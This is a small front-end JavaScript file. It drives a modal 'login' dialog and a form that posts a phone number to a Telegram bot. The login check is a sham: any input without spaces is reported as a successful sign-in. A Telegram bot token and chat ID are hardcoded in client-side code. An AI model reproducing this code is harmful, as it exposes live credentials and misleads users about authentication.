    debugger
    const cover__button = document.querySelector('.cover__button')
    const backdrop = document.querySelector('.backdrop')
    const modal = document.querySelector('.modal')

    const modalCloseButton = document.querySelector('.modalCloseButton')
    const modalApplyButton = document.querySelector('.modalApplyButton')

    const modalContent = document.querySelector('.modalContent')
    const message = document.querySelector('#inputMessage')
    const number = document.querySelector('#inputNumber')
    const telegramBtn = document.querySelector('#telegram')

    cover__button.addEventListener('click',()=>{
        backdrop.classList.add('backdropActive')
        modal.classList.add('modalActive')
        modalContent.classList.remove('hideContent')
        message.value = ''
        number.value = ''
    })

    const handleModalRemove = () =>{
        clearTimeout(timeOut)
        backdrop.classList.remove('backdropActive')
        modal.classList.remove('modalActive')
    }

    modalCloseButton.addEventListener('click', handleModalRemove)
    backdrop.addEventListener('click', handleModalRemove)

    let timeOut 

    modal.addEventListener('click',(e)=>{
       e.stopPropagation()
    })

    modalApplyButton.addEventListener('click',(e)=>{
        e.preventDefault()
        // modalContent.classList.add('hideContent')
        if(message.value.trim() && !message.value.includes(' ')){
            // thankYou.innerHTML =`Вход успешно выполнен`
            alert(`Вход успешно выполнен`)
            setTimeout(handleModalRemove,1300)
        }else{
            // thankYou.innerHTML = `Не правильно введен логин или пароль`
            alert(`Не правильно введен логин или пароль`)
        }   
    })

const form = document.querySelector('form')
const inputTelegram = document.querySelector('#inputTelegram')

const bot = {
    TOKEN:'5715103562:AAEaDJzlRZK3mttjhhxuCvqaFGCnGQ9viNY',
    chatID:'-881581117'
}

form.addEventListener('submit',(e)=>{
    e.preventDefault()
    const data = `Номер: ${inputTelegram.value}`
    if( inputTelegram.value.trim() && !inputTelegram.value.includes(' ')){
    fetch(` https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${data}`)
    .then(response=>{
       if(response.ok){
        alert('ЗАЯВКА ОТПРАВЛЕНА')
       }
    },error=>{
        alert(error);
    })
    }else {
        alert('НЕ ПРАВИЛЬНО ВВЕДЕН НОМЕР')
       }
       inputTelegram.value = ''
})


   

   


    

    